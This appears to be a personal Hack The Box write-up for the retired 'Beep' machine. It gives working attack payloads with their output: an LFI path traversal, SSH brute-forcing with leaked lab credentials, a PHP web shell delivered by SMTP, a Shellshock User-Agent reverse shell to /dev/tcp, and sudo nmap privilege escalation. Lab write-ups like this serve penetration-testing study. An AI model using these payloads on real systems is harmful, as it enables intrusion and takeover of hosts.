# Beep (Retired)

Retired at the time of attempt.

Sources of information

* [ippsec](https://youtu.be/XJmBpOd__N8)
* [Rana Khali](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/beep-writeup-w-o-metasploit)
* [0xdf](https://0xdf.gitlab.io/2021/02/23/htb-beep.html)



## Recon



### nmap

```nmap
# Nmap 7.91 scan initiated Sat Nov 21 19:10:06 2020 as: nmap -sC -sV -oA nmap/beep 10.10.10.7
Nmap scan report for 10.10.10.7
Host is up (0.032s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: PIPELINING TOP AUTH-RESP-CODE APOP STLS IMPLEMENTATION(Cyrus POP3 server v2) USER LOGIN-DELAY(0) RESP-CODES EXPIRE(NEVER) UIDL
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            874/udp   status
|_  100024  1            877/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: LIST-SUBSCRIBED NO RIGHTS=kxte URLAUTHA0001 MULTIAPPEND Completed OK NAMESPACE ATOMIC MAILBOX-REFERRALS IMAP4rev1 UNSELECT SORT=MODSEQ QUOTA STARTTLS IDLE RENAME BINARY CONDSTORE SORT CATENATE LISTEXT IMAP4 ANNOTATEMORE THREAD=ORDEREDSUBJECT THREAD=REFERENCES ID X-NETSCAPE LITERAL+ UIDPLUS CHILDREN ACL
443/tcp   open  ssl/https?
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2020-11-21T20:13:30+00:00; +1h00m00s from scanner time.
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com

Host script results:
|_clock-skew: 59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov 21 19:16:35 2020 -- 1 IP address (1 host up) scanned in 388.97 seconds

```

### Web page

#### Port 80



![image-20210414172126711](/home/boolean/.config/Typora/typora-user-images/image-20210414172126711.png)



#### Port 10000

![image-20210414172340721](/home/boolean/.config/Typora/typora-user-images/image-20210414172340721.png)

Elastix is an open-source option for deploying your own PBX installation.



## FFUF

```bash
(boolean㉿kalibox)[~/htb/beep-pwnd/ffuf]$ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt -u https://10.10.10.7/FUZZ -o root-dir.json  

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : https://10.10.10.7/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
 :: Output file      : root-dir.json
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

admin                   [Status: 301, Size: 309, Words: 20, Lines: 10]
images                  [Status: 301, Size: 310, Words: 20, Lines: 10]
themes                  [Status: 301, Size: 310, Words: 20, Lines: 10]
modules                 [Status: 301, Size: 311, Words: 20, Lines: 10]
help                    [Status: 301, Size: 308, Words: 20, Lines: 10]
var                     [Status: 301, Size: 307, Words: 20, Lines: 10]
mail                    [Status: 301, Size: 308, Words: 20, Lines: 10]
static                  [Status: 301, Size: 310, Words: 20, Lines: 10]
lang                    [Status: 301, Size: 308, Words: 20, Lines: 10]
libs                    [Status: 301, Size: 308, Words: 20, Lines: 10]
panel                   [Status: 301, Size: 309, Words: 20, Lines: 10]
configs                 [Status: 301, Size: 311, Words: 20, Lines: 10]
                        [Status: 200, Size: 1785, Words: 103, Lines: 35]
recordings              [Status: 301, Size: 314, Words: 20, Lines: 10]
vtigercrm               [Status: 301, Size: 313, Words: 20, Lines: 10]
                        [Status: 200, Size: 1785, Words: 103, Lines: 35]
:: Progress: [62283/62283] :: Job [1/1] :: 104 req/sec :: Duration: [0:08:31] :: Errors: 3 ::

```



### Searchsploit 

```bash
(boolean㉿kalibox)[~]$ searchsploit --id elastix            
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                     |  EDB-ID
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Elastix - 'page' Cross-Site Scripting                                                                                                                                              | 38078
Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                            | 38544
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                      | 34942
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                                                                                                   | 37637
Elastix 2.x - Blind SQL Injection                                                                                                                                                  | 36305
Elastix < 2.5 - PHP Code Injection                                                                                                                                                 | 38091
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                                                             | 18650
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```



```bash
(boolean㉿kalibox)[~]$ searchsploit --id freepbx
------------------------------------------------------- ---------------------------------
 Exploit Title                                         |  EDB-ID
------------------------------------------------------- ---------------------------------
FreePBX - 'config.php' Remote Code Execution (Metasplo | 32512
FreePBX 13 - Remote Command Execution / Privilege Esca | 40614
FreePBX 13.0.35 - Remote Command Execution             | 40296
FreePBX 13.0.35 - SQL Injection                        | 40312
FreePBX 13.0.x < 13.0.154 - Remote Command Execution   | 40345
FreePBX 13/14 - Remote Command Execution / Privilege E | 40232
FreePBX 2.1.3 - 'upgrade.php' Remote File Inclusion    | 2665
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution | 18650
FreePBX 2.11.0 - Remote Command Execution              | 32214
FreePBX 2.2 - SIP Packet Multiple HTML Injection Vulne | 29873
FreePBX 2.5.1 - SQL Injection                          | 11186
FreePBX 2.5.2 - '/admin/config.php?tech' Cross-Site Sc | 33442
FreePBX 2.5.2 - Zap Channel Addition Description Param | 33443
FreePBX 2.5.x - Information Disclosure                 | 11187
FreePBX 2.5.x < 2.6.0 - Persistent Cross-Site Scriptin | 11184
FreePBX 2.8.0 - Recordings Interface Allows Remote Cod | 15098
FreePBX 2.9.0/2.10.0 - 'callmenum' Remote Code Executi | 18659
FreePBX 2.9.0/2.10.0 - Multiple Vulnerabilities        | 18649
FreePBX < 13.0.188 - Remote Command Execution (Metaspl | 40434
Freepbx < 2.11.1.5 - Remote Code Execution             | 41005
------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```



## Version Information

### FreePBX 2.8.1.4 

This seems to be dated around 2010



![image-20210414174914422](/home/boolean/.config/Typora/typora-user-images/image-20210414174914422.png)



## Method 1 - LFI

Reading through the directories of Elastix, such as help you will find that the software is quite old, around 2012 era. 

Using the options returned from searchsploit, we take a look at exploit 37637, and it indicates its exploitable using the following url - /vtigercrm/graph.php?current_language=../../../../../../../../<file path>%00&module=Accounts&action

The exploit suggests /etc/amportal.conf, which does disclose some passwords 

```bash
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE
```

#### /etc/passwd

(no login users removed from the list)

```bash
root:x:0:0:root:/root:/bin/bash
sync:x:5:0:sync:/sbin:/bin/sync
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
spamfilter:x:500:500::/home/spamfilter:/bin/bash
fanis:x:501:501::/home/fanis:/bin/bash
```

Gathering users from the passwd file and passwords from the amportal.conf file we can generate files for hydra.

```bash
(boolean㉿kalibox)[~/htb/beep-pwnd]$ hydra -L users -P passwords ssh://10.10.10.7                             

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-14 18:31:15
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 18 login tries (l:6/p:3), ~2 tries per task
[DATA] attacking ssh://10.10.10.7:22/
[22][ssh] host: 10.10.10.7   login: root   password: jEhdIekWmdjE
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-14 18:31:29

```

Just a little FYI to login via you need to prepends the following to the command as it uses a deprecated cipher.

```bash
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.10.10.7 
```



## Boom! Box done!



## Method 2 LFI & Email Hijacking (Is that the right name?)

This is new to me so the notes will be light.

Firstly send an email via telnet with a php script to execute commands.

```bash
(boolean㉿kalibox)[~/htb/beep-pwnd]$ telnet 10.10.10.7 25                                                                                                                                                      1 ⨯
Trying 10.10.10.7...
Connected to 10.10.10.7.
Escape character is '^]'.
mail from:boolean@htb.eu    

220 beep.localdomain ESMTP Postfix
250 2.1.0 Ok
500 5.5.2 Error: bad syntax
rcpt to:asterisk@localhost
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
Subject: Exploit Script
<?php echo system($_REQUEST['cmd']); ?>      

.
250 2.0.0 Ok: queued as 9CFE4D9306
```

Now in combination with the [LFI exploit](https://www.exploit-db.com/exploits/37637) from above we should be able to do RCE. I send the LFI to burp just to make things easier. The mail for the asterisk user can be found in the var mail directory. 

Along with the LFI for the mail append on the cmd to the request, in the below example I send a reverse shell to port 1337, also note the payload is URL encoded.

![image-20210414195136427](/home/boolean/.config/Typora/typora-user-images/image-20210414195136427.png)

However, this only gets a shell as the asterisk user.  To privesc we need to borrow some code from another [exploit](php/webapps/18650.py), this tells us that nmap has the ability to run as sudo without a password. 

```bash
bash-3.2$ sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
whoami
root
```

## Method 3 Direct RCE from Exploit-18650

Running the script as is, after changing the lhost and lport is that it runs into the SSL error. The solution employed by ippsec was to use burp as a proxy, so the rhost becomes localhost, and edit the https to be http. The other alternative is to remove the SSL dependency from the exploit scripts code.

The script fails without a reason, to determine the reason you can send the request to repeater and observe the response which tells us that the extension does not exist. You can find a valid extension is by using the tool sipvicious and reveal extension 233. Note this tool or beep seems to be flakey, it took a while to narrow it down.

After, adapting the script and setting up burp, running the script should be straight forward and return a reverse shell as user asterisk, and you can use the same privesc using nmap to get to user.

```bash
(boolean㉿kalibox)[~/htb/beep-pwnd/ffuf]$ sudo nc -lvnp 443                                                                                                                      1 ⨯
listening on [any] 443 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.7] 36203
id  
uid=100(asterisk) gid=101(asterisk)
sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
id 
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```



## Method 4 - ShellShock on Webmin (Port 10000)

This server is not the typical shell shockable, whereby you get a response, like if you were doing apache shellshock.  So a blind test using sleep command is required.

```html
User-Agent: () { :; };sleep 10
```

This should prove that the server is shockable, so now it is safe to assume we can get a reverse shell.

```html
User-Agent: () { :; };bash -i >& /dev/tcp/10.10.14.24/9001 0>&1
```

```bash
(boolean㉿kalibox)[~/htb/beep-pwnd/ffuf]$ nc -lvnp 9001                                                                          
listening on [any] 9001 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.7] 42915
bash: no job control in this shell
[root@beep webmin]#
```

